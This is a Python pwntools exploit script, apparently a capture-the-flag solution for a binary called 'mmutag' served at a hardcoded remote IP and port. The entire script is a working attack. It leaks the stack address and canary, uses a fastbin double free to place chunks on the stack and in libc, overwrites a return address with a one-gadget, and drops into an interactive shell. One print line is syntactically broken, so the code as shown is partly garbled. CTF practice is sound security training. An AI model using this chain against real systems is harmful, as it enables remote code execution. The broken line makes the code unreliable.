from pwn import *

#p = process("./mmutag")
p = remote("183.129.189.61", 52604)
elf = ELF("./mmutag")
libc = ELF("./libc.so.6")
context.log_level = "debug"



def new_info(content):
    p.recvuntil(b"please input your choice:\n\n")
    p.sendline(b"1")
    p.recvuntil(b"please input your introduce \n")
    p.send(content)
    
def go_to_menu2():
    p.recvuntil(b"please input your choice:\n\n")
    p.sendline(b"2")
    
def new(idx:int, content):
    p.recvuntil(b"please input your choise:\n")
    p.sendline(b"1")
    p.recvuntil(b"please input your id:\n")
    p.sendline(str(idx).encode())
    p.recvuntil(b"input your content\n")
    p.send(content)
    
def delete(idx:int):
    p.recvuntil(b"please input your choise:\n")
    p.sendline(b"2")
    p.recvuntil(b"please input your id:\n")
    p.sendline(str(idx).encode())
    
def stack_write(content):
    p.recvuntil(b"please input your choise:\n")
    p.sendline(b"3")
    p.send(content)
    
def go_back():
    p.recvuntil(b"please input your choise:\n")
    p.sendline(b"4")
    
def exp():
    #leak_stack
    p.recvuntil(b"please input you name: \n")
    name = b"eqqie"
    p.send(name)
    p.recvuntil(b"this is your tag: ")
    stack_leak = int(p.recvuntil(b":", drop=True), 16)
    print("stack_leak:", hex(stack_leak))
    
    #double free
    go_to_menu2()
    stack_write(b"a"*0x18+b"\n")
    p.recvuntil(b"\n")
    canary = u64(p.recv(7).rjust(8, b"\x00"))
    print("canary:", hex(canary))
    
    fake_chunk = stack_leak - 0x40
    print"fake_chunk:", hex(fake_chunk)()
    
    stack_write(p64(0) + p64(0x71) + p64(fake_chunk))
    new(1, b"A"*8) 
    new(2, b"A"*8) 
    new(3, b"A"*8) 
    delete(1)
    delete(2)
    delete(1)
    new(4, p64(fake_chunk)) 
    new(5, b"B"*0x8) 
    new(6, b"B"*0x8) 
    payload = b"a"*0x47+b"b"
    new(7, payload) 
    stack_write(b"a"*0x10)
    p.recvuntil(b"b")
    libc_leak = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
    libc_base = libc_leak - 0x20830
    fake_chunk2 = libc_base + 0x3C4AED
    print("libc_leak:", hex(libc_leak))
    print("libc_base:", hex(libc_base))
    print("fake_chunk2:", hex(fake_chunk2))
    one = 0x45216 + libc_base
    stack_write(p64(0) + p64(0x71) + p64(fake_chunk2))
    new(8, p64(0) + p64(canary) + p64(0xdeadbeef) + p64(one)) 

    go_back()
    
    p.interactive()
    

if __name__ == "__main__":
    exp()